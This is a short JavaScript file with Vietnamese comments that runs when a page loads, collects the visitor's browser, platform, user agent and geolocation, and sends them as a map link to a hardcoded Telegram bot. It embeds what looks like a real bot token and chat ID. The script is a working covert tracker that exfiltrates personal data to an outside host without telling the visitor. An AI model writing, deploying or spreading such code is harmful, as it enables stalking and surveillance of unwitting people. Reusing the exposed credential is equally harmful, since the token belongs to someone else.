const TELEGRAM_BOT_TOKEN = "8150545362:AAEKUQF0tJ7qkpMajhpV48baUbZ5IHnF-HA"; // ⚠️ NÊN ĐỔI TOKEN MỚI
const TELEGRAM_CHAT_ID = "6339940126"; // ID Telegram nhận tin nhắn

// Hàm lấy thông tin trình duyệt & thiết bị
function getDeviceInfo() {
    const userAgent = navigator.userAgent;
    let browser = "Không xác định";

    if (userAgent.includes("Chrome")) browser = "Google Chrome";
    if (userAgent.includes("Firefox")) browser = "Mozilla Firefox";
    if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) browser = "Safari";
    if (userAgent.includes("Edg")) browser = "Microsoft Edge";
    if (userAgent.includes("OPR") || userAgent.includes("Opera")) browser = "Opera";

    return {
        userAgent: userAgent,
        browser: browser,
        platform: navigator.platform
    };
}

// Hàm lấy vị trí & gửi đến Telegram
function sendInfoToTelegram() {
    const deviceInfo = getDeviceInfo();

    // Lấy vị trí địa lý
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((position) => {
            const { latitude, longitude } = position.coords;
            const locationUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;

            const message = `
🔍 **THÔNG TIN TRUY CẬP**
🌍 Vị trí: [Xem trên bản đồ](${locationUrl})
💻 Hệ điều hành: ${deviceInfo.platform}
🌐 Trình duyệt: ${deviceInfo.browser}
🖥️ User-Agent: ${deviceInfo.userAgent}
            `;

            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            fetch(telegramUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: "Markdown"
                })
            });
        }, (error) => {
            console.log("Không thể lấy vị trí:", error);
        });
    } else {
        console.log("Trình duyệt không hỗ trợ định vị.");
    }
}

// Gọi hàm gửi thông tin khi trang được tải
sendInfoToTelegram();
